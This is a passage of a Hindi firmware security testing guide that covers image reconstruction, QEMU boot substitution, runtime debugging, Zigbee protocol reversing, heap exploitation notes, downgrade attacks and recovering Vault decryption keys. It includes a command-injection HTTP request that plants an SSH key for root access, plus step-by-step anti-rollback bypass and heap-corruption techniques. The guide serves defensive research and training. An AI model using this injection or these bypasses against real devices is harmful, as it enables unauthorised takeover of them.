Firmware की arithmetic को हूबहू बनाए रखें। खास तौर पर पता करें कि lengths bytes, 512-byte sectors या 4 KiB pages में हैं; shifts और truncation को उनके मूल क्रम में दोहराएँ; और A/B layouts में bank के अनुसार बदलने वाले tail regions को ध्यान में रखें। उदाहरण के लिए, `(partition_bytes >> 12) << 3` पहले 4 KiB boundary तक truncate करता है और उसके बाद परिणाम को 512-byte sectors में व्यक्त करता है; इसे `partition_bytes // 512` से बदलने पर जोड़ा गया extent कुछ kilobytes खिसक सकता है और SquashFS की आगे की सभी tables corrupt हो सकती हैं।<sup>[[11]](#references)</sup>

सत्यापन के लिए एक उपयोगी workflow है:<sup>[[11]](#references)</sup>

1. Verifier/init binary से हर `dm-linear` segment का source device, start sector और length पता करें।
2. Alignment semantics बदले बिना extents को जोड़ें या map करें।
3. यदि extraction अब भी विफल हो, तो अनुमानित boundary के आसपास केवल एक छोटी window में खोजें और अकेले plausible superblock को स्वीकार करने के बजाय लगातार कई valid metadata structures की पुष्टि करें।
4. पुनर्निर्मित image पर unmodified `unsquashfs` चलाएँ; सभी directories और fragments को सफलतापूर्वक traverse करना, `unsquashfs -stat` से अधिक मजबूत प्रमाण है।

#### Analyst-नियंत्रित dm-verity replacement

जब analyst के नियंत्रण में QEMU kernel, initramfs और virtual disks हों, तो vendor के verification PID 1 को छोटे statically linked init से बदलकर modified root को boot किया जा सकता है। यह **lab boot-chain substitution** है, dm-verity, उसके RSA signature, Secure Boot या TPM-sealed key को तोड़ना नहीं।<sup>[[11]](#references)</sup>

Replacement init को मूल boot path के operational हिस्सों की नकल करनी चाहिए: `devtmpfs` mount करें, `setsid()` call करें, `/dev/console` को file descriptors 0–2 से connect करें, `/proc` और `/sys` mount करें, दिए गए block device के आने तक प्रतीक्षा करें, edited root को read-only mount करें, पुराने root के pseudo-filesystems detach करें, नए mount को `/` पर move करें, `chroot` करें और firmware के मूल `/sbin/init` को `execve()` करें। `MS_MOVE` से **पहले** `/dev`, `/proc` और `/sys` को detach करने से नए root से जुड़े mount points गलती से detach नहीं होंगे।<sup>[[11]](#references)</sup>

Mutable device state को modified immutable root से अलग रखें। qcow2 overlay मूल disk की LVM state को सुरक्षित रख सकता है, जबकि दूसरा read-only virtio disk edited SquashFS उपलब्ध करा सकता है:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Offline image-state debugging

जब धीमे boot, विनाशकारी startup scripts या अविश्वसनीय console logging के कारण विफलता का पता लगाना मुश्किल हो, तो guest के बाहर persistent state की जाँच करें। किसी चल रहे VM द्वारा उपयोग किए जा रहे overlay को कभी attach न करें; उसे `qemu-nbd` से expose करें, LVM discovery को इच्छित NBD partition तक सीमित रखें, और डिस्कनेक्ट करने से पहले volume group को deactivate करें।<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

दोहराए जा सकने वाले fault isolation के लिए, किसी स्थिर writable volume पर timestamp वाले marker files लिखें और उन्हें offline सत्यापित करें; `/dev/kmsg`, FIFOs और अस्थायी consoles rate limiting या process के जल्दी बंद हो जाने के कारण false negatives दे सकते हैं। असंबंधित code बदलने से पहले, layers के बीच exact interfaces की तुलना भी करें: `uname -r` बनाम `/lib/modules/`, disk पर मौजूद ext4 features बनाम kernel configuration, और Mesa के `libGL` generation बनाम DRI driver ABI तथा PCI से प्राप्त driver names। कोई component मौजूद हो सकता है और `dlopen()` सफलतापूर्वक कर सकता है, फिर भी उपयोग के योग्य न हो, क्योंकि उसका consumer अलग ABI की अपेक्षा करता है।<sup>[[11]](#references)</sup>

## व्यवहार में Dynamic Analysis

इस चरण में, analysis के लिए किसी वास्तविक या emulated device environment का उपयोग किया जाता है। OS और filesystem तक shell access बनाए रखना आवश्यक है। Emulation hardware interactions की पूरी तरह नकल नहीं कर सकती, इसलिए कभी-कभी emulation को restart करना पड़ सकता है। Analysis में filesystem की फिर से जाँच करनी चाहिए, उजागर webpages और network services का exploit करना चाहिए, और bootloader की vulnerabilities की जाँच करनी चाहिए। संभावित backdoor vulnerabilities की पहचान के लिए firmware integrity tests महत्वपूर्ण हैं।

## Runtime Analysis की तकनीकें

Runtime analysis में किसी process या binary के operating environment में उससे interact करना शामिल है। इसके लिए breakpoints सेट करने और fuzzing तथा अन्य तकनीकों से vulnerabilities की पहचान करने हेतु gdb-multiarch, Frida और Ghidra जैसे tools का उपयोग किया जाता है।

पूर्ण debugger के बिना embedded targets के लिए, **एक statically-linked `gdbserver`** device पर copy करें और उससे remotely attach करें:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor संदेश मैपिंग

IoT hubs में RF stack अक्सर **radio MCU** और Linux userland process के बीच विभाजित होता है। एक उपयोगी workflow है इस path को map करना:<sup>[[8]](#references)</sup>

1. हवा में **RF frame**
2. radio MCU पर **controller-side parser**
3. Linux को भेजा गया **serial/UART text या TLV protocol** (उदाहरण के लिए `/dev/tty*`)
4. मुख्य daemon में **application dispatcher**
5. **protocol-specific handler / state machine**

यह architecture एक के बजाय दो reversing targets बनाता है। यदि controller binary radio frames को `Group,Command,arg1,arg2,...` जैसे textual protocol में बदलता है, तो इनकी जानकारी निकालें:

- **message groups** और dispatch tables
- कौन-से messages **network** से आ सकते हैं और कौन-से स्वयं controller से
- सटीक **manufacturer-specific discriminator fields** (उदाहरण के लिए Zigbee `manufacturer_code` और custom `cluster_command`)
- कौन-से handlers केवल **commissioning**, discovery या firmware/model download phases के दौरान reachable होते हैं

विशेष रूप से Zigbee के लिए, pairing traffic capture करें और जाँचें कि target अब भी default **Link Key** `ZigBeeAlliance09` पर निर्भर है या नहीं। यदि ऐसा है, तो commissioning traffic sniff करने से **Network Key** उजागर हो सकती है। Zigbee 3.0 install codes इस exposure को कम करते हैं, इसलिए ध्यान दें कि जाँचा गया device वास्तव में उन्हें enforce करता है या नहीं।

### Manufacturer-specific protocol handlers और FSM-gated reachability

Vendor-specific Zigbee/ZCL commands अक्सर standardized clusters से बेहतर target होते हैं, क्योंकि वे कम परखे गए validation वाले **custom parsing code** और internal **FSMs** तक पहुँचते हैं।<sup>[[8]](#references)</sup>

व्यावहारिक workflow:

- **vendor-only handler** मिलने तक command dispatcher को reverse करें।
- **FSM state**, **event**, **check**, **action** और **next-state** tables निकालें।
- ऐसे **transitional states** पहचानें जो अपने-आप आगे बढ़ते हैं, और retry/error branches जो अंततः attacker-controlled state को reset या free करते हैं।
- यह मानने के बजाय कि buggy handler हमेशा reachable है, पुष्टि करें कि daemon को vulnerable state में लाने के लिए कौन-से वैध protocol exchanges आवश्यक हैं।

Timing-sensitive protocols के लिए, Python framework से packet replay करना बहुत धीमा हो सकता है। अधिक विश्वसनीय तरीका है कि vendor-grade stack वाले real hardware (उदाहरण के लिए **nRF52840**) पर किसी वैध device का emulation करें, ताकि सही **endpoints**, **attributes** और commissioning timing उपलब्ध कराई जा सके।

### Embedded daemons में fragmented-download bug class

एक बार-बार दिखने वाली firmware bug class **fragmented blob/model/configuration downloads** में मिलती है:<sup>[[8]](#references)</sup>

1. **पहला fragment** (`offset == 0`) `ctx->total_size` store करता है और `malloc(total_size)` allocate करता है।
2. बाद के fragments केवल attacker-controlled **packet-local** fields की जाँच करते हैं, जैसे `packet_total_size >= offset + chunk_len`।
3. Copy `memcpy(&ctx->buffer[offset], chunk, chunk_len)` के ज़रिए होती है, लेकिन **मूल allocated size** के विरुद्ध जाँच नहीं की जाती।

इससे attacker ये कर सकता है:

- छोटा heap allocation कराने के लिए **छोटे** declared total size वाला पहला वैध fragment भेजना।
- बाद में **अपेक्षित offset** के साथ बड़ा `chunk_len` वाला fragment भेजना।
- ऐसा forged packet-local size देना जो नई checks को संतुष्ट करे, फिर भी मूल allocated buffer को overflow कर दे।

जब vulnerable path commissioning logic के पीछे हो, तो malformed fragments भेजने से पहले target को अपेक्षित model-download या blob-download state में लाने के लिए पर्याप्त **device emulation** शामिल होना चाहिए।

### Protocol-driven `free()` triggers

Embedded daemons में heap metadata exploitation trigger करने का सबसे आसान तरीका अक्सर "cleanup का इंतज़ार करना" नहीं, बल्कि **protocol के अपने error handling को मजबूर करना** होता है:<sup>[[8]](#references)</sup>

- FSM को **retry** या **error** states में धकेलने के लिए malformed follow-up fragments भेजें।
- retry threshold पार करें, ताकि daemon **context reset** करे और corrupted buffer को free करे।
- Process के असंबंधित कारणों से crash होने से पहले allocator-side primitives trigger करने के लिए इस अनुमानित `free()` का उपयोग करें।

यह embedded Linux के **musl/uClibc/dlmalloc-like** allocators के विरुद्ध विशेष रूप से उपयोगी है, जहाँ chunk metadata को corrupt करके unlink/unbin logic को write primitive में बदला जा सकता है। एक स्थिर तरीका है कि **size field** को corrupt करके allocator traversal को overflowed buffer के अंदर रखे गए **fake chunks** की ओर मोड़ा जाए, बजाय इसके कि real bin pointers को तुरंत overwrite करके process crash कर दिया जाए।

## Binary Exploitation और Proof-of-Concept

पहचानी गई vulnerabilities के लिए PoC विकसित करने हेतु target architecture की गहरी समझ और lower-level languages में programming आवश्यक है। Embedded systems में binary runtime protections दुर्लभ हैं, लेकिन मौजूद होने पर Return Oriented Programming (ROP) जैसी techniques आवश्यक हो सकती हैं।

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc, glibc जैसे fastbins का उपयोग करता है। बाद में किया गया कोई बड़ा allocation `__malloc_consolidate()` trigger कर सकता है, इसलिए किसी भी fake chunk को checks पास करनी होंगी (उचित size, `fd = 0`, और आसपास के chunks को "in use" माना जाना)।<sup>[[6]](#references)</sup>
- **ASLR के अंतर्गत Non-PIE binaries:** यदि ASLR enabled है, लेकिन मुख्य binary **non-PIE** है, तो binary के भीतर `.data/.bss` addresses स्थिर रहते हैं। ऐसे region को target किया जा सकता है जो पहले से valid heap chunk header जैसा दिखता हो, ताकि fastbin allocation **function pointer table** पर हो।
- **Parser-stopping NUL:** JSON parse होने पर payload में `\x00` parsing रोक सकता है, जबकि stack pivot/ROP chain के लिए attacker-controlled trailing bytes बने रहते हैं।
- **`/proc/self/mem` के ज़रिए Shellcode:** `open("/proc/self/mem")`, `lseek()` और `write()` call करने वाली ROP chain किसी ज्ञात mapping में executable shellcode रखकर वहाँ jump कर सकती है।

## Firmware Analysis के लिए तैयार Operating Systems

[AttifyOS](https://github.com/adi0x90/attifyos) और [EmbedOS](https://github.com/scriptingxss/EmbedOS) जैसे operating systems firmware security testing के लिए आवश्यक tools से लैस, पहले से configured environments उपलब्ध कराते हैं।

## Firmware का विश्लेषण करने के लिए तैयार OSs

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS एक distro है, जिसका उद्देश्य Internet of Things (IoT) devices का security assessment और penetration testing करने में आपकी मदद करना है। यह सभी आवश्यक tools से लैस pre-configured environment देकर आपका काफी समय बचाता है।
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Ubuntu 18.04 पर आधारित embedded security testing operating system, जिसमें firmware security testing tools पहले से शामिल हैं।

## Firmware Downgrade Attacks और Insecure Update Mechanisms

भले ही vendor firmware images के लिए cryptographic signature checks लागू करता हो, **version rollback (downgrade) protection अक्सर छोड़ दी जाती है**। जब boot- या recovery-loader केवल embedded public key से signature verify करता है, लेकिन flash की जा रही image के *version* (या monotonic counter) की तुलना नहीं करता, तो attacker वैध रूप से **पुराना, vulnerable firmware, जिस पर अब भी valid signature हो**, install कर सकता है और इस तरह patched vulnerabilities फिर से मौजूद हो सकती हैं।<sup>[[4]](#references)</sup>

आम attack workflow:

1. **पुरानी signed image प्राप्त करें**
   * इसे vendor के public download portal, CDN या support site से लें।
   * इसे companion mobile/desktop applications से निकालें (उदाहरण के लिए Android APK में `assets/firmware/` के अंतर्गत)।
   * VirusTotal, Internet archives, forums आदि जैसे third-party repositories से इसे प्राप्त करें।
2. किसी भी उपलब्ध update channel के ज़रिए device पर image **upload करें या serve करें**:
   * Web UI, mobile-app API, USB, TFTP, MQTT आदि।
   * कई consumer IoT devices में ऐसे *unauthenticated* HTTP(S) endpoints होते हैं जो Base64-encoded firmware blobs स्वीकार करते हैं, उन्हें server-side decode करते हैं और recovery/upgrade शुरू कर देते हैं।
3. Downgrade के बाद, newer release में patch की गई vulnerability का exploit करें (उदाहरण के लिए बाद में जोड़ा गया command-injection filter)।
4. Persistence मिलने के बाद पहचान से बचने के लिए चाहें तो latest image वापस flash करें या updates disable कर दें।

### उदाहरण: Downgrade के बाद Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

असुरक्षित (downgraded) firmware में, `md5` पैरामीटर को बिना sanitisation के सीधे shell command में जोड़ दिया जाता है, जिससे arbitrary commands inject किए जा सकते हैं (यहाँ—SSH key-based root access सक्षम करना)। बाद के firmware versions में एक basic character filter जोड़ा गया, लेकिन downgrade protection न होने के कारण यह fix बेअसर है।<sup>[[4]](#references)</sup>

### Mobile Apps से Firmware निकालना

कई vendors अपने companion mobile applications में पूरी firmware images शामिल करते हैं, ताकि app Bluetooth/Wi-Fi के ज़रिए device को update कर सके। ये packages आम तौर पर APK/APEX में `assets/fw/` या `res/raw/` जैसे paths पर unencrypted रूप में stored होते हैं। `apktool`, `ghidra` या यहाँ तक कि plain `unzip` जैसे tools आपको physical hardware को छुए बिना signed images निकालने देते हैं।<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot designs में केवल updater-आधारित anti-rollback bypass

कुछ vendors anti-downgrade **ratchet** लागू करते हैं, लेकिन केवल *updater* logic के भीतर (उदाहरण के लिए CAN पर UDS routine, recovery command, या userspace OTA agent)। अगर **bootloader** बाद में केवल image signature/CRC जाँचता है और partition table या slot metadata पर भरोसा करता है, तो rollback protection को फिर भी bypass किया जा सकता है।<sup>[[7]](#references)</sup>

आम तौर पर कमज़ोर design:

- Firmware metadata में version descriptor और **security ratchet** / monotonic counter, दोनों होते हैं।
- Updater image ratchet की तुलना persistent storage में रखी value से करता है और पुराने signed images को अस्वीकार कर देता है।
- Bootloader उस ratchet को **parse नहीं** करता और चुने गए slot से boot करने से पहले केवल header, CRC और signature verify करता है।
- Slot activation को partition table या per-slot generation counter में अलग से store किया जाता है और इसे उस सटीक firmware digest से **cryptographically bind नहीं** किया जाता जिसे validate किया गया था।

इससे dual-slot systems में **एक image को validate करना / दूसरी image से boot करना** संभव हो जाता है। अगर attacker updater से मौजूदा signed image के ज़रिए slot B को अगला boot target mark करवा सकता है और reboot से पहले slot B को overwrite कर सकता है, तो bootloader फिर भी downgraded image boot कर सकता है, क्योंकि वह केवल पहले से committed slot metadata पर भरोसा करता है।

दुरुपयोग का आम तरीका:

1. एक **मौजूदा signed** firmware को passive slot पर upload करें और सामान्य validation/switch routine चलाएँ, ताकि layout उस slot को अगला active slot mark करे।
2. **अभी reboot न करें**। उसी session में slot-preparation/erase routine फिर से चलाएँ।
3. Stale boot-state या stale slot-selection logic का दुरुपयोग करें, ताकि updater उसी physical slot को erase करे जिसे अभी-अभी promote किया गया था।
4. उस slot में **पुराना, लेकिन अब भी signed** firmware लिखें।
5. Ratchet लागू करने वाली validation routine को छोड़ें और सीधे reboot करें।
6. Bootloader promoted slot चुनता है, केवल signature/integrity verify करता है और पुरानी image boot करता है।

A/B update implementations को reverse करते समय इन बातों पर ध्यान दें:

- Slot selection **boot-time flags** से तय होता है, जो सफल switch के बाद refresh नहीं होते।
- `prepare_passive_slot()` जैसी routine **मौजूदा committed layout** के बजाय stale state के आधार पर slot erase करती है।
- `part_write_layout()` जैसा function केवल **generation counter** / active flag बढ़ाता है और validated image hash store नहीं करता।
- Ratchet checks userspace या updater code में लागू हैं, लेकिन ROM / bootloader / secure boot stages में **नहीं**।
- Erase या recovery routines slot का content हटाने और दोबारा लिखने के बाद भी उसे bootable mark रहने देती हैं।

### Update Logic का आकलन करने के लिए Checklist

* क्या *update endpoint* का transport/authentication पर्याप्त रूप से सुरक्षित है (TLS + authentication)?
* क्या device flashing से पहले **version numbers** या **monotonic anti-rollback counter** की तुलना करता है?
* क्या image को secure boot chain के भीतर verify किया जाता है (उदाहरण के लिए, ROM code द्वारा signatures की जाँच)?
* क्या **bootloader updater जैसा ही ratchet लागू करता है**, या केवल signature/CRC जाँचता है?
* क्या slot activation metadata को **validated firmware digest/version से bind** किया गया है, या promotion के बाद slot को बदला जा सकता है?
* Slot switch सफल होने के बाद क्या device को reboot करना अनिवार्य है, या उसी session में बाद की update/erase routines अब भी उपलब्ध हैं?
* क्या userland code अतिरिक्त sanity checks करता है (उदाहरण के लिए, अनुमत partition map, model number)?
* क्या *partial* या *backup* update flows भी वही validation logic इस्तेमाल करते हैं?

> 💡  अगर ऊपर दी गई कोई भी चीज़ मौजूद नहीं है, तो संभवतः platform rollback attacks के प्रति vulnerable है।

## अभ्यास के लिए vulnerable firmware

Firmware में vulnerabilities ढूँढ़ने का अभ्यास करने के लिए, शुरुआत में इन vulnerable firmware projects का उपयोग करें।

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Embedded KMS/Vault state से firmware decryption keys पुनर्प्राप्त करना

जब कोई update image थोड़े-से plaintext metadata के साथ एक बड़ा high-entropy blob रखती है, तो brute-forcing से पहले container triage करें:<sup>[[1]](#references)</sup>

- `hexdump`, `xxd`, `strings -tx`, `base64 -d`, और `binwalk -E` से headers, offsets और line boundaries dump करें।
- `Salted__` का आम तौर पर अर्थ OpenSSL `enc` format होता है: अगले 8 bytes salt होते हैं और बाकी bytes ciphertext।
- ऐसा Base64 field जो decode होकर ठीक `256` bytes बने, इस बात का मज़बूत संकेत है कि आप RSA-2048 ciphertext देख रहे हैं, जो random firmware password/session key को wrap करता है।
- उसी file में मौजूद Detached PGP material अक्सर केवल authenticity की सुरक्षा करता है; यह न मानें कि वही confidentiality mechanism है।

अगर static key hunting (`grep`, `strings`, PEM/PGP searches) से कुछ न मिले, तो केवल private keys खोजने के बजाय **operational decrypt path** को reverse करें:

- Updater / management binary को decompile करें और trace करें कि encrypted blob कौन पढ़ता है, कौन-सा helper/API उसे unwrap करता है, और वह किस logical key name का अनुरोध करता है।
- Extract किए गए root filesystem में KMS state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) के साथ unit files और init scripts खोजें।
- Plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens, या local KMS auto-unseal scripts को private-key material के समान मानें।

अगर appliance में original Vault binary और storage backend शामिल हैं, तो Vault internals को फिर से implement करने की तुलना में उस environment को replay करना आम तौर पर आसान होता है:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

KMS के cloned संस्करण पर root access के साथ:

- केवल isolated clone के अंदर transit keys को exportable बनाएँ: `vault write transit/keys/<name>/config exportable=true`
- unwrap key export करें: `vault read transit/export/encryption-key/<name>`
- recovered RSA key को KMS में इस्तेमाल किए गए सटीक padding/hash pair के साथ आज़माएँ। PKCS#1 v1.5 decrypt और default OAEP decrypt का विफल होना यह साबित **नहीं** करता कि key गलत है; Vault-backed कई flows SHA-256 के साथ OAEP का उपयोग करते हैं, जबकि सामान्य libraries में default SHA-1 होता है।
- अगर payload `Salted__` से शुरू होता है, तो AES-CBC decryption आज़माने से पहले vendor के OpenSSL KDF (`EVP_BytesToKey`, पुराने appliances में अक्सर MD5) को ठीक उसी तरह दोहराएँ।

इससे "encrypted firmware" एक अधिक सामान्य समस्या बन जाता है: **appliance-side operational keys recover करें, फिर offline सटीक unwrap + KDF parameters को दोहराएँ**।

## Training और Certifications

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude के साथ Firmware Cracking: Senior-Level Skill, Junior-Level Autonomy](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking: Internet of Things पर हमले करने की निर्णायक गाइड](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [छोड़े गए hardware में zero days का फायदा उठाना – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [एक $20 के Smart Device ने मुझे आपके घर तक पहुँच कैसे दी](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [अब आप mi को देखते हैं: अब आप Pwned हैं](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Tesla Wall Connector को उसके charge port connector से exploit करना - भाग 2: anti-downgrade को bypass करना](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [इसे Blink करें: Philips Hue Bridge का Over-the-Air Exploitation](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [QEMU पर Tesla OS को ROOT करना, भाग 1: Unpacking](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux kernel documentation - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [QEMU पर Tesla OS को ROOT करना, भाग 2: Debugging और Fixing](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS Passwords: कमजोर XOR Encryption से SPI Flash से Recovery संभव (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Dell BIOS password recovery tooling](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — Hardware Hacking पर अपनी जानकारी ताज़ा करें, भाग 2](https://voidstarsec.com/blog/brushing-up-part-2)
- [15] [हमने Cypherock Hardware Wallet को कैसे और क्यों Hack किया: पूरी कहानी](https://www.darknavy.org/blog/how_and_why_we_hacked_cypherock_hardware_wallet_the_full_story/)
{{#include ../../banners/hacktricks-training.md}}
